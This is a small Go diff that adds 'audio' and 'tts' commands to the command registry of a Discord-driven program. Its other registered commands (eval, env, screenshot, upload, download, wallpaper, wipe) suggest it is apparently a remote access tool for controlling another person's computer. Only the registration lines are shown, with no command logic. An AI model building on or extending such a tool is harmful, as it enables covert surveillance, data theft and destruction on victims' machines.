@@ -163,6 +163,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func register() {
+	commandsList["audio"] = &commands.AudioCommand{}
 	commandsList["download"] = &commands.DownloadCommand{}
 	commandsList["env"] = &commands.EnvCommand{}
 	commandsList["eval"] = &commands.EvalCommand{}
@@ -175,6 +176,7 @@ func register() {
 	commandsList["setting"] = &commands.SettingCommand{}
 	commandsList["ss"] = &commands.ScreenShotCommand{}
 	commandsList["tree"] = &commands.TreeCommand{}
+	commandsList["tts"] = &commands.TTSCommand{}
 	commandsList["upload"] = &commands.UploadCommand{}
 	commandsList["wallpaper"] = &commands.WallpaperCommand{}
 	commandsList["wipe"] = &commands.WipeCommand{}
